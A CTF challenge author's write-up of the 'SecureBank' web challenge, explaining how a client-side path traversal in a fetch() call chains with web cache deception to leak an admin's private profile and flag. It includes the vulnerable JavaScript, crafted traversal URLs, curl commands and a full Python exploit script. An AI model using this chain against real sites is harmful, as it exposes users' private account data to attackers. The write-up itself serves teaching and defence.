## Introduction

I had the honor of being a challenge author for **Fetch The Flag CTF 2026**, organized by Snyk and HackingHub. I designed a single web challenge called **SecureBank**, and by the end of the competition it had been solved **34 times**.

> **Want to try it yourself?** You can run the challenge locally before reading further: [github.com/F0DH1L/snyk_ctf_2k26_chall](https://github.com/F0DH1L/snyk_ctf_2k26_chall)

![Challenge on the platform](image.png)

SecureBank is an online banking application that contains two seemingly harmless vulnerabilities. Neither one is exploitable in isolation, but chaining them together yields **complete account takeover** of the bank administrator. This article walks through the intended solution: combining a **Client-Side Path Traversal (CSPT)** with a **Web Cache Deception** flaw to leak the admin's sensitive profile data and the flag.

---

## Exploring the Application

After registering an account, players land on a standard banking dashboard. The interface shows account information and, importantly, a **"Report Suspicious Activity to Bank Security"** button, a clear hint that an admin bot actively visits reported URLs, much like an XSS-bot scenario.

![Login page](image-1.png)
![Main dashboard](image-2.png)

---

## Vulnerability 1, Web Cache Deception

### Discovering the Cached Endpoint

Intercepting the authenticated API request that loads user profile data reveals the following exchange:

```http
GET /api/profile/549384146d072a64 HTTP/1.1
Host: 0q930pc949s2.ctfhub.io
X-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
Accept-Encoding: gzip, deflate, br

HTTP/1.1 200 OK
Server: nginx/1.28.0
Date: Tue, 17 Feb 2026 20:01:28 GMT
Content-Type: application/json
Content-Length: 97
Connection: keep-alive
X-Cache-Status: MISS

{
  "email": "asdf@f.com",
  "flag": "",
  "user_id": "549384146d072a64",
  "username": "asdf"
}
```

![Cache MISS on normal request](image-3.png)

The `X-Cache-Status: MISS` header tells us the response was **not** served from the cache. So far, nothing unusual.

### Triggering the Cache

With the profile endpoint in sight, I started experimenting, testing common cache deception techniques against it. One of the usual tricks paid off: appending a static-file extension (`.css`) to the API URL changes the caching behavior:

- `Cache-Control` flips to `max-age=86400, public`
- On a second request, `X-Cache-Status` becomes **HIT**, the reverse proxy is now serving a cached copy of the JSON response.

![Cache HIT after appending .css](image-4.png)

This is a textbook **Web Cache Deception** issue: the reverse proxy decides to cache a response based purely on the URL extension, ignoring the actual `Content-Type`, backend cache directives, and authentication requirements.

### Why It's Not Exploitable Alone

At first glance, this looks devastating, but there is a catch. The API authenticates requests via a custom `X-Auth-Token` header. **Browsers do not attach custom headers to regular navigations.** If an attacker simply sends a victim a link to `/api/profile/victim_id.css`, the browser visits it without the token, the backend returns `401 Unauthorized`, and the CDN caches an error, useless.

To weaponize this, we need a way to **force the victim's browser to issue an authenticated request** to the cacheable endpoint.

---

## Vulnerability 2, Client-Side Path Traversal (CSPT)

### Inspecting the Frontend

Reviewing the source of the profile page reveals how the client fetches user data:

```javascript
async function loadUserProfile() {
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('userId');
    
    if (!userId) {
        showError('No account ID provided');
        return;
    }
    
    const apiUrl = `http://${window.location.host}/api/profile/${userId}`;
    
    try {
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'X-Auth-Token': authToken,  
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br'
            }
        });
        
        const data = await response.json();
        displayUserData(data);
    } catch (err) {
        showError('Failed to load account data');
    }
}
```

The `userId` query parameter is concatenated directly into the API URL with **zero validation**. Because the resulting string is passed to `fetch()`, which automatically normalizes directory-traversal sequences, an attacker can redirect the request to an arbitrary same-origin path.

### Proof of Concept

Visiting the following URL confirms the traversal:

```
http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4
```

The JavaScript constructs `/api/users/info/../../api/profile/a1b2c3d4`, which the browser normalizes to `/api/profile/a1b2c3d4`. The request goes out **with the victim's `X-Auth-Token` header attached**, and the API responds normally.

![CSPT working, authenticated request redirected](image-5.png)

On its own, this CSPT doesn't accomplish much, the attacker can only redirect the victim's request to other endpoints on the same origin. But combined with the cache deception finding, it becomes the missing piece of the puzzle.

---

## Chaining the Bugs, Full Exploit

### The Core Idea

| Vulnerability | What it provides |
|---|---|
| **CSPT** | Control over the path of an **authenticated** `fetch()` request |
| **Cache Deception** | Any request to a URL ending in `.css` is cached **publicly** by the CDN |

By injecting a traversal payload that ends in `.css`, the CSPT forces the victim's browser to make an **authenticated request to a cacheable URL**. The CDN then stores the response, making the victim's private data accessible to anyone.

### Step by Step Exploitation

**1. Register an attacker account**

```bash
curl -X POST http://localhost:1337/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker123","email":"attacker@evil.com","password":"password123"}'
```

```json
{
  "success": true,
  "auth_token": "eyJhbGc...",
  "username": "attacker123"
}
```

**2. Decode the JWT to obtain the user ID**

```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
payload = jwt.decode(token, options={"verify_signature": False})
print(payload["user_id"])  
```

**3. Craft the malicious URL**

```
http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4e5f6.css
```

When the victim visits this link, the following chain fires:

1. The profile page loads and reads the `userId` query parameter.
2. JavaScript constructs the API URL: `/api/users/info/../../api/profile/a1b2c3d4e5f6.css`
3. The browser normalizes it to: `/api/profile/a1b2c3d4e5f6.css`
4. `fetch()` sends the request **with the victim's auth token**.
5. The backend returns the victim's profile JSON.
6. The CDN sees a `.css` URL and **caches the response publicly**.

**4. Report the URL to the admin**

Using the in-app reporting feature, submit the crafted URL. The admin bot visits it with an authenticated session, triggering the CSPT → Cache Deception chain.

```
GET /api/profile/a1b2c3d4e5f6.css
X-Auth-Token: <ADMIN_TOKEN>
```

The admin's profile data is now cached.

**5. Retrieve the cached data**

```bash
curl http://localhost:1337/api/profile/a1b2c3d4e5f6.css
```

```json
{
  "user_id": "admin_id_xyz",
  "username": "Administrator",
  "email": "admin@securebank.com",
  "flag": "flag{cache_deception_with_cspt_gadget_thats_absolute_cinema}"
}
```

No authentication required, the CDN happily serves the cached admin data.

---

## Final Exploit

The full exploit script automates every step: registration, login, URL reporting, and flag retrieval.

```python
import requests
import uuid

base_url = "https://0q930pc949s2.ctfhub.io"
auth_token = ""

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}

def register(username, email, password):
    url = f"{base_url}/api/register"
    data = {"username": username, "email": email, "password": password}
    response = requests.post(url, json=data)
    print(f"Registration response: {response.status_code}")
    return response.json()

def login(username, password):
    url = f"{base_url}/api/login"
    data = {"username": username, "password": password}
    response = requests.post(url, json=data)
    global auth_token
    auth_token = response.json().get("auth_token", "")
    print(f"Login response: {response.status_code}, Auth Token: {auth_token}")
    return response.json()

def get_profile(user_id):
    url = f"{base_url}/api/profile/{user_id}"
    response = requests.get(url, proxies=proxies, verify=False)
    return response.json()

def report_url(auth_token, url_to_report):
    url = f"{base_url}/api/report"
    headers = {"X-Auth-Token": auth_token}
    data = {"url": url_to_report}
    response = requests.post(url, json=data, headers=headers, proxies=proxies, verify=False)
    print(f"Report URL response: {response.status_code}")
    return response.json()

# --- Exploit Flow ---
username = "asdf1234" + str(uuid.uuid4())
email = "email" + str(uuid.uuid4()) + "@gmail.com"
password = "password123"

register(username, email, password)
login(username, password)

malicious_url = f"{base_url}/profile?userId=../../../../../../api/profile/asdf_{username}.css"
report_url(auth_token, malicious_url)

result = get_profile(f"asdf_{username}.css")
print(result)
```

```
{'email': 'admin@example.com', 'flag': 'flag{cache_deception_with_cspt_gadget_thats_absolute_cinema}', 'user_id': '707f09fc9547f88b', 'username': 'Administrator'}
```

![Exploit output, admin flag retrieved](image-6.png)

---

## Key Takeaways

- **Neither vulnerability was critical on its own.** The cache deception needed an authenticated trigger; the CSPT had no direct impact. Together, they produced a full account takeover.
- **CSPT is an underrated gadget.** It doesn't just redirect navigations, it can weaponize `fetch()` calls that carry auth tokens, turning innocent client-side code into an attacker-controlled HTTP client.

Thanks to Snyk and HackingHub for hosting the CTF, I hope players enjoyed the challenge!